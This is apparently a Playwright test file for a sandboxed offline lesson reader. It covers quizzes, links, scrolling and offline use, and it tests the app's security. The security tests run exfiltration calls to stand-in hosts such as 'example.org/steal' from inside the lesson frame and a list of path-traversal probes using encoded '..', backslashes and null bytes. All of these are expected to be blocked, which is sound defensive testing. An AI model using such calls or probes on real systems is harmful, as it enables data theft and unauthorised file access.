// T-009 (developer): a lesson in a sandboxed iframe, served by the Service
// Worker from IndexedDB at ./c/<course>/<path> (D-011, ARCHITECTURE §5).
// T-045: adapted to the isolated lesson (D-029): opaque origin, sandbox
// "allow-scripts" only, the stricter lesson CSP. Playwright reaches the
// cross-origin frame through page.frames()/frameLocator (never contentDocument).
// Uses the synthetic course tests/fixtures/LRN-DEMO (D-026).
// Optional: T009_REAL_DIR=/path/to/LRN-<topic> opens lesson 0001 of a real
// course kept outside the repository and checks its own quiz/reflect scripts.
import { test, expect } from '@playwright/test';
import { existsSync } from 'node:fs';
import { basename } from 'node:path';
import { DRIVE_ZIP_NAME, readFixture, makeZip, asFile } from '../fixtures/zips.mjs';
import { rawZip } from '../fixtures/rawzip.mjs';
import { strToU8 } from '../../vendor/fflate.js';

const FILES = readFixture();
const LESSON_PATH = 'lessons/0001-vidove-chay.html';
const REF_PATH = 'reference/R01-temperatura-i-vreme.html';

let problems;
let allowed; // console errors expected by a test (CSP reports)
test.beforeEach(async ({ page, context }) => {
  problems = [];
  allowed = [];
  page.on('console', (m) => { if (m.type() === 'error') problems.push(m.text()); });
  page.on('pageerror', (e) => problems.push(String(e)));
  // Never touch the real network.
  await context.route(/^https?:\/\/(?!localhost)/, (route) => route.fulfill({ status: 200, contentType: 'text/html', body: '<p>external</p>' }));
  await loadControlled(page);
});
test.afterEach(() => {
  expect(problems.filter((p) => !allowed.some((re) => re.test(p)))).toEqual([]);
});

async function loadControlled(page) {
  await page.goto('./');
  await expect(page.locator('[data-screen="courses"]')).toBeVisible();
  await page.evaluate(() => navigator.serviceWorker.ready.then(() => true));
  await page.reload();
  await expect(page.locator('[data-screen="courses"]')).toBeVisible();
  expect(await page.evaluate(() => !!navigator.serviceWorker.controller)).toBe(true);
}

/** Import files (Playwright file payloads) through importCourse() in the page. */
async function importFiles(page, files) {
  return page.evaluate(async (files) => {
    const m = await import('./src/course-import.js');
    const list = files.map((f) => new File([new Uint8Array(f.bytes)], f.name));
    return m.describeSummary(await m.importCourse(list));
  }, files.map((f) => ({ name: f.name, bytes: [...f.buffer] })));
}
const importDemo = (page) => importFiles(page, [asFile(DRIVE_ZIP_NAME, makeZip(FILES))]);

const lessonFrame = (page) => page.frameLocator('iframe.lesson-frame');
const frameOf = (page, path) => page.frames().find((f) => f.url().includes(`/c/LRN-DEMO/${path}`));

async function openLesson(page, number = '0001') {
  await page.goto(`./#/c/LRN-DEMO/read/${number}`);
  await expect(page.locator('[data-screen="reader"]')).toBeVisible();
  await expect(lessonFrame(page).locator('h1')).toBeVisible();
}

test.describe('T-009 opening lessons', () => {
  test('"Курс" lists lessons and references as links; a click opens the lesson in the iframe', async ({ page }) => {
    await importDemo(page);
    await page.goto('./#/c/LRN-DEMO');
    const links = page.locator('[data-screen="course"] a.lesson-link');
    await expect(links).toHaveText(['0001 Какви видове чай има?', 'R01 Температура и време за запарване']);
    await expect(links.nth(0)).toHaveAttribute('href', '#/c/LRN-DEMO/read/0001');
    await links.nth(0).click();
    await expect(page).toHaveURL(/#\/c\/LRN-DEMO\/read\/0001$/);
    await expect(page.locator('#app-bar-title')).toHaveText('Урок 0001');
    await expect(lessonFrame(page).locator('h1')).toHaveText('Какви видове чай има?');

    const frame = page.locator('iframe.lesson-frame');
    await expect(frame).toHaveAttribute('sandbox', 'allow-scripts');
    await expect(frame).toHaveAttribute('allow', 'clipboard-write *');
    expect(await frame.getAttribute('src')).toMatch(/\/EasyLRN\/c\/LRN-DEMO\/lessons\/0001-vidove-chay\.html$/);
    // The lesson's own CSS (relative ../assets/style.css) and inline script ran.
    const f = frameOf(page, LESSON_PATH);
    expect(await f.evaluate(() => document.documentElement.getAttribute('data-inline-script'))).toBe('ran');
    expect(await f.evaluate(() => getComputedStyle(document.querySelector('.kicker')).textTransform)).toBe('uppercase');

    await page.goBack();
    await page.locator('[data-screen="course"] a.lesson-link').nth(1).click();
    await expect(page.locator('#app-bar-title')).toHaveText('Справочник R01');
    await expect(lessonFrame(page).locator('h1')).toHaveText('Температура и време за запарване');
  });

  test('the iframe is as tall as the lesson (no inner scroll) and follows DOM changes', async ({ page }) => {
    await importDemo(page);
    await openLesson(page);
    const f = frameOf(page, LESSON_PATH);
    const measure = async () => ({
      frame: await page.locator('iframe.lesson-frame').evaluate((el) => el.getBoundingClientRect().height),
      doc: await f.evaluate(() => document.documentElement.getBoundingClientRect().height),
      inner: await f.evaluate(() => document.scrollingElement.scrollHeight - innerHeight),
    });
    await expect.poll(async () => Math.abs((await measure()).frame - (await measure()).doc)).toBeLessThan(2);
    const m1 = await measure();
    expect(m1.frame).toBeGreaterThan(1200);
    expect(m1.inner).toBeLessThanOrEqual(1);
    // The window scrolls, not the frame.
    expect(await page.evaluate(() => document.scrollingElement.scrollHeight > innerHeight)).toBe(true);
    // The quiz redraws itself bigger: the frame grows with it.
    await lessonFrame(page).locator('.quiz-choice').first().click();
    await expect(lessonFrame(page).locator('.quiz-note')).toBeVisible();
    await expect.poll(async () => (await measure()).frame).toBeGreaterThan(m1.frame);
    await expect.poll(async () => { const m = await measure(); return Math.abs(m.frame - m.doc); }).toBeLessThan(2);
  });

  test('a missing lesson and a course that is not imported give Bulgarian messages', async ({ page }) => {
    await page.goto('./#/c/LRN-DEMO/read/0001');
    await expect(page.locator('[data-field="reader-missing"]')).toHaveText('Курсът още не е импортиран.');
    await importDemo(page);
    await page.goto('./#/c/LRN-DEMO/read/0099');
    await expect(page.locator('[data-field="reader-missing"]')).toHaveText('Урокът не е намерен в курса. Импортирай курса отново.');
  });
});

test.describe('T-009 the lesson scripts work unchanged', () => {
  test('quiz (redraws its DOM): answer, feedback, next, result, again', async ({ page }) => {
    await importDemo(page);
    await openLesson(page);
    const q = lessonFrame(page).locator('.quiz');
    await expect(q.locator('.quiz-head')).toContainText('1 / 3');
    await q.locator('.quiz-choice', { hasText: 'От окисляването' }).click();
    await expect(q.locator('.quiz-note')).toContainText('Вярно.');
    await expect(q.locator('.quiz-choice.is-right')).toHaveCount(1);
    await q.locator('.quiz-next').click();
    await q.locator('.quiz-choice', { hasText: 'Да' }).click();
    await expect(q.locator('.quiz-note')).toContainText('Не е вярно.');
    await expect(q.locator('.quiz-choice.is-wrong')).toHaveCount(1);
    await q.locator('.quiz-next').click();
    await q.locator('.quiz-choice', { hasText: '75–80' }).click();
    await q.locator('.quiz-next').click();
    await expect(q.locator('.quiz-result')).toHaveText('Резултат: 2 от 3');
    await q.locator('.quiz-again').click();
    await expect(q.locator('.quiz-head')).toContainText('1 / 3');
  });

  test('reflect: the answers are collected into one text (clipboard or manual copy)', async ({ page }) => {
    await importDemo(page);
    await openLesson(page);
    const r = lessonFrame(page).locator('.reflect');
    await r.locator('#t1').fill('Зелен');
    await r.locator('#t2').fill('80 °C, 2 минути');
    await r.locator('.reflect-collect').click();
    await expect(r.locator('.reflect-output')).toHaveText('LRN-DEMO · Урок 0001 · Моят чай\nКакъв чай пиеш най-често?: Зелен\nС каква вода го запарваш и колко време?: 80 °C, 2 минути');
    await expect(r.locator('.reflect-status')).toHaveText(/Копирано\.|Копирай текста ръчно\./);
  });

  test('injected style: text size from the settings and ::highlight colours', async ({ page }) => {
    await importDemo(page);
    await page.evaluate(async () => (await import('./src/db.js')).saveSettings({ fontScale: 1.25 }));
    await openLesson(page);
    const f = frameOf(page, LESSON_PATH);
    expect(await f.evaluate(() => getComputedStyle(document.documentElement).fontSize)).toBe('22.5px'); // 18px × 1.25
    const css = await f.evaluate(() => document.querySelector('style[data-easylrn]').textContent);
    for (const c of ['yellow', 'green', 'blue', 'pink', 'orange']) expect(css).toContain(`::highlight(lrn-${c})`);
  });
});

test.describe('T-009 links', () => {
  test('relative link to R01 and the claude.ai artifact link open the local R01 in the app; back returns', async ({ page }) => {
    await importDemo(page);
    await openLesson(page);
    await lessonFrame(page).locator('a', { hasText: 'R01 Температура и време' }).click();
    await expect(page).toHaveURL(/#\/c\/LRN-DEMO\/read\/R01$/);
    await expect(lessonFrame(page).locator('h1')).toHaveText('Температура и време за запарване');
    await lessonFrame(page).locator('a', { hasText: 'урок 0001' }).click();
    await expect(page).toHaveURL(/#\/c\/LRN-DEMO\/read\/0001$/);
    await lessonFrame(page).locator('a[href^="https://claude.ai/artifact/DemoArtifactR01"]').click();
    await expect(page).toHaveURL(/#\/c\/LRN-DEMO\/read\/R01$/);
    await page.goBack();
    await expect(page).toHaveURL(/#\/c\/LRN-DEMO\/read\/0001$/);
    await expect(lessonFrame(page).locator('h1')).toHaveText('Какви видове чай има?');
  });

  test('an external link opens in a new tab; the lesson stays', async ({ page, context }) => {
    await importDemo(page);
    await openLesson(page);
    const popup = context.waitForEvent('page');
    await lessonFrame(page).locator('a[href="https://example.org/tea"]').click();
    const tab = await popup;
    await tab.waitForLoadState();
    expect(tab.url()).toBe('https://example.org/tea');
    expect(await tab.evaluate(() => window.opener)).toBe(null);
    await expect(page).toHaveURL(/#\/c\/LRN-DEMO\/read\/0001$/);
    expect(frameOf(page, LESSON_PATH)).toBeTruthy();
    await tab.close();
  });

  test('an in-page anchor scrolls the app window to the heading', async ({ page }) => {
    await importDemo(page);
    await openLesson(page);
    expect(await page.evaluate(() => scrollY)).toBe(0);
    await lessonFrame(page).locator('a[href="#voda"]').click();
    await expect.poll(() => page.evaluate(() => scrollY)).toBeGreaterThan(300);
    const top = await lessonFrame(page).locator('#voda').evaluate((el) => el.getBoundingClientRect().top);
    const frameTop = await page.locator('iframe.lesson-frame').evaluate((el) => el.getBoundingClientRect().top);
    const bar = await page.locator('.app-bar').evaluate((el) => el.getBoundingClientRect().height);
    const atEnd = await page.evaluate(() => Math.abs(scrollY - (document.scrollingElement.scrollHeight - innerHeight)) < 2);
    // The heading is just under the app bar (or the page is scrolled to its end).
    expect(atEnd || Math.abs(frameTop + top - bar - 8) < 3).toBe(true);
    expect(frameTop + top).toBeGreaterThanOrEqual(bar);
    await expect(page).toHaveURL(/#\/c\/LRN-DEMO\/read\/0001$/);
  });

  test('the reading position is saved and restored', async ({ page }) => {
    await importDemo(page);
    await openLesson(page);
    const target = await page.evaluate(() => Math.min(900, document.scrollingElement.scrollHeight - innerHeight - 20));
    expect(target).toBeGreaterThan(200);
    await page.evaluate((y) => window.scrollTo(0, y), target);
    await expect.poll(() => page.evaluate(async () => (await (await import('./src/db.js')).getLesson('LRN-DEMO/lessons/0001-vidove-chay.html')).progress.scrollY), { timeout: 3000 })
      .toBeGreaterThan(target - 200);
    const saved = await page.evaluate(async () => (await (await import('./src/db.js')).getLesson('LRN-DEMO/lessons/0001-vidove-chay.html')).progress.scrollY);
    await page.goto('./#/c/LRN-DEMO');
    await page.goto('./#/c/LRN-DEMO/read/0001');
    await expect.poll(() => page.evaluate(() => scrollY)).toBeGreaterThan(target - 200);
    const y = await page.evaluate(() => scrollY);
    const frameTop = await page.locator('iframe.lesson-frame').evaluate((el) => el.getBoundingClientRect().top + scrollY);
    const bar = await page.locator('.app-bar').evaluate((el) => el.getBoundingClientRect().height);
    expect(Math.abs(y - (frameTop - bar + saved))).toBeLessThan(3);
  });
});

test.describe('T-009 security', () => {
  test('course responses carry the CSP (connect-src none) and nosniff', async ({ page }) => {
    await importDemo(page);
    const h = await page.evaluate(async () => {
      const r = await fetch('./c/LRN-DEMO/lessons/0001-vidove-chay.html');
      return { status: r.status, type: r.headers.get('content-type'), csp: r.headers.get('content-security-policy'), nosniff: r.headers.get('x-content-type-options') };
    });
    expect(h).toMatchObject({ status: 200, type: 'text/html; charset=utf-8', nosniff: 'nosniff' });
    for (const d of ['sandbox allow-scripts', "default-src 'none'", "connect-src 'none'", "worker-src 'none'", "frame-src 'none'", "form-action 'none'", "object-src 'none'", "frame-ancestors 'self'", 'img-src data: blob:']) {
      expect(h.csp).toContain(d);
    }
  });

  test('fetch/XHR/beacon/WebSocket/external image/worker from the lesson are blocked by the CSP', async ({ page, context }) => {
    allowed = [/Content Security Policy/, /Refused to/];
    const leaked = [];
    context.on('requestfinished', (q) => { if (/example\.org|api\.anthropic\.com|INDEX\.md/.test(q.url())) leaked.push(q.url()); });
    await importDemo(page);
    await openLesson(page);
    const f = frameOf(page, LESSON_PATH);
    const r = await f.evaluate(async () => {
      const violations = [];
      document.addEventListener('securitypolicyviolation', (e) => violations.push(e.effectiveDirective));
      const attempt = async (fn) => { try { await fn(); return 'allowed'; } catch (e) { return 'blocked'; } };
      const out = {
        fetchExternal: await attempt(() => fetch('https://example.org/steal?k=1')),
        fetchSelf: await attempt(() => fetch('../INDEX.md')),
        fetchApi: await attempt(() => fetch('https://api.anthropic.com/v1/messages', { method: 'POST' })),
        xhr: await attempt(() => new Promise((res, rej) => { const x = new XMLHttpRequest(); x.open('GET', 'https://example.org/x'); x.onload = res; x.onerror = rej; x.send(); })),
        beacon: (navigator.sendBeacon('https://example.org/b', 'k'), 'sent'),
        ws: await attempt(() => new Promise((res, rej) => { const w = new WebSocket('wss://example.org/'); w.onopen = res; w.onerror = rej; })),
        worker: await attempt(() => new Promise((res, rej) => { const w = new Worker('../assets/quiz.js'); w.onerror = rej; setTimeout(res, 500); })),
        img: await new Promise((res) => { const i = new Image(); i.onload = () => res('allowed'); i.onerror = () => res('blocked'); i.src = 'https://example.org/t.png'; }),
      };
      await new Promise((r2) => setTimeout(r2, 300));
      return { out, violations: [...new Set(violations)].sort() };
    });
    expect(r.out).toEqual({ fetchExternal: 'blocked', fetchSelf: 'blocked', fetchApi: 'blocked', xhr: 'blocked', beacon: 'sent', ws: 'blocked', worker: 'blocked', img: 'blocked' });
    // The worker from ../assets is refused even before the CSP: the lesson's origin is opaque (cross-origin script URL).
    expect(r.violations).toEqual(expect.arrayContaining(['connect-src', 'img-src']));
    // sendBeacon() returns true even when the CSP drops it: what counts is that no request left.
    await page.waitForTimeout(300);
    expect(leaked).toEqual([]);
  });

  test('the lesson cannot navigate the app (no allow-top-navigation)', async ({ page }) => {
    allowed = [/Unsafe attempt to initiate navigation|not allowed to navigate|sandboxed/i];
    await importDemo(page);
    await openLesson(page);
    const f = frameOf(page, LESSON_PATH);
    const r = await f.evaluate(() => { try { top.location.href = 'https://example.org/'; return 'navigated'; } catch (e) { return e.name; } });
    expect(r).not.toBe('navigated');
    await page.waitForTimeout(300);
    expect(page.url()).toMatch(/\/EasyLRN\/#\/c\/LRN-DEMO\/read\/0001$/);
  });

  test('paths: "..", %2e%2e, double encoding, encoded slashes and backslashes never leave the course', async ({ page }) => {
    allowed = [/status of 40[04]/];
    await importDemo(page);
    // A second course with a file of the same path: never served for LRN-DEMO.
    await importFiles(page, [asFile('LRN-OTHER.zip', Buffer.from(rawZip([
      { name: 'LRN-OTHER/lessons/0001-x.html', data: strToU8('<h1>OTHER</h1>') },
      { name: 'LRN-OTHER/secret.md', data: strToU8('SECRET') },
    ])))]);
    // A file stored with a literal "%2e%2e" segment (T-008 Н-4).
    await importFiles(page, [asFile('LRN-DEMO.zip', Buffer.from(rawZip([
      { name: `LRN-DEMO/${LESSON_PATH}`, data: FILES[LESSON_PATH] },
      { name: 'LRN-DEMO/assets/%2e%2e/x.js', data: strToU8('literal') },
    ])))]);
    const r = await page.evaluate(async () => {
      const probe = async (u) => { const res = await fetch(u); const t = await res.text(); return `${res.status} ${t.includes('SECRET') ? 'SECRET' : t.includes('serviceWorker') || t.includes('Service Worker') ? 'APP' : ''}`.trim(); };
      const urls = [
        './c/LRN-DEMO/MISSION.md',
        './c/LRN-DEMO/lessons/../MISSION.md', // resolved by the URL parser: still inside the course
        './c/LRN-DEMO/lessons/%2e%2e/MISSION.md',
        './c/LRN-DEMO/%2e%2e/LRN-OTHER/secret.md', // URL parser → ./c/LRN-OTHER/secret.md (that course's own URL)
        './c/LRN-DEMO/lessons/%252e%252e/MISSION.md',
        './c/LRN-DEMO/assets/%252e%252e/x.js',
        './c/LRN-DEMO/..%2fLRN-OTHER%2fsecret.md',
        './c/LRN-DEMO/%2e%2e%2fLRN-OTHER/secret.md',
        './c/LRN-DEMO/%252e%252e%252fLRN-OTHER/secret.md',
        './c/LRN-DEMO/lessons/..%5c..%5cMISSION.md',
        './c/LRN-DEMO/lessons%5c..%5c..%5csw.js',
        './c/..%2fsrc/db.js',
        './c/LRN-DEMO%2f..%2fLRN-OTHER/secret.md',
        './c/LRN-DEMO/secret.md',
        './c/LRN-DEMO/',
        './c/LRN-DEMO/%E0%A4%A',
        './c/LRN-DEMO/lessons/%00.html',
      ];
      const out = {};
      for (const u of urls) out[u] = await probe(u);
      return out;
    });
    expect(r).toEqual({
      './c/LRN-DEMO/MISSION.md': '200',
      './c/LRN-DEMO/lessons/../MISSION.md': '200',
      './c/LRN-DEMO/lessons/%2e%2e/MISSION.md': '200',
      './c/LRN-DEMO/%2e%2e/LRN-OTHER/secret.md': '200 SECRET',
      './c/LRN-DEMO/lessons/%252e%252e/MISSION.md': '400',
      './c/LRN-DEMO/assets/%252e%252e/x.js': '400',
      './c/LRN-DEMO/..%2fLRN-OTHER%2fsecret.md': '400',
      './c/LRN-DEMO/%2e%2e%2fLRN-OTHER/secret.md': '400',
      './c/LRN-DEMO/%252e%252e%252fLRN-OTHER/secret.md': '400',
      './c/LRN-DEMO/lessons/..%5c..%5cMISSION.md': '400',
      './c/LRN-DEMO/lessons%5c..%5c..%5csw.js': '400',
      './c/..%2fsrc/db.js': '400',
      './c/LRN-DEMO%2f..%2fLRN-OTHER/secret.md': '400',
      './c/LRN-DEMO/secret.md': '404',
      './c/LRN-DEMO/': '400',
      './c/LRN-DEMO/%E0%A4%A': '400',
      './c/LRN-DEMO/lessons/%00.html': '400',
    });
  });

  test('before anything is imported, ./c/ answers 404 with a marked error page', async ({ page }) => {
    allowed = [/status of 404/];
    const r = await page.evaluate(async () => {
      const res = await fetch('./c/LRN-DEMO/lessons/0001-vidove-chay.html');
      return { status: res.status, meta: (await res.text()).includes('easylrn-error') };
    });
    expect(r.status).toBe(404);
    expect(r.meta).toBe(true);
  });
});

test.describe('T-009 offline', () => {
  test('offline: reload, open the course, the lesson, its quiz and the R01 link', async ({ page, context }) => {
    await importDemo(page);
    await context.setOffline(true);
    try {
      await page.reload();
      await page.goto('./#/c/LRN-DEMO');
      await page.locator('a.lesson-link').first().click();
      await expect(lessonFrame(page).locator('h1')).toHaveText('Какви видове чай има?');
      await lessonFrame(page).locator('.quiz-choice').first().click();
      await expect(lessonFrame(page).locator('.quiz-note')).toBeVisible();
      await lessonFrame(page).locator('a', { hasText: 'R01 Температура и време' }).click();
      await expect(lessonFrame(page).locator('h1')).toHaveText('Температура и време за запарване');
    } finally {
      await context.setOffline(false);
    }
  });
});

test.describe('T-009 real lesson (T009_REAL_DIR, outside the repository)', () => {
  test('lesson 0001 of a real course: its own quiz.js and reflect.js run unchanged', async ({ page }, info) => {
    const dir = process.env.T009_REAL_DIR;
    test.skip(!dir || !existsSync(dir) || info.project.name !== 'tablet-landscape', 'needs T009_REAL_DIR');
    allowed = [/fonts\.g/];
    const root = basename(dir.replace(/[\\/]+$/, ''));
    const real = readFixture(dir);
    await importFiles(page, [asFile(`${root}.zip`, makeZip(real, { root }))]);
    await page.goto(`./#/c/${root}`);
    await page.locator('a.lesson-link').first().click();
    const lf = lessonFrame(page);
    await expect(lf.locator('h1')).toBeVisible();
    const quiz = lf.locator('.quiz').first();
    await expect(quiz.locator('.opt').first()).toBeVisible();
    await quiz.locator('.opt').first().click();
    await expect(quiz.locator('.quiz-fb')).toBeVisible();
    await quiz.locator('.quiz-controls .btn').first().click();
    await expect(quiz.locator('.quiz-meta')).toContainText('2 /');
    const reflect = lf.locator('.reflect').first();
    await reflect.locator('textarea').first().fill('тест');
    await reflect.locator('button', { hasText: 'Копирай' }).click();
    await expect(reflect.locator('textarea[readonly]')).toBeVisible();
    await expect(reflect.locator('textarea[readonly]')).toHaveValue(/тест/);
    // A claude.ai artifact link that is in INDEX.md opens the local reference.
    const artifact = lf.locator('a[href^="https://claude.ai/artifact/"]').first();
    if (await artifact.count()) {
      await artifact.click();
      await expect(page).toHaveURL(new RegExp(`#/c/${root}/read/R\\d+$`));
    }
    await page.screenshot({ path: info.outputPath('real-lesson.png') });
  });
});
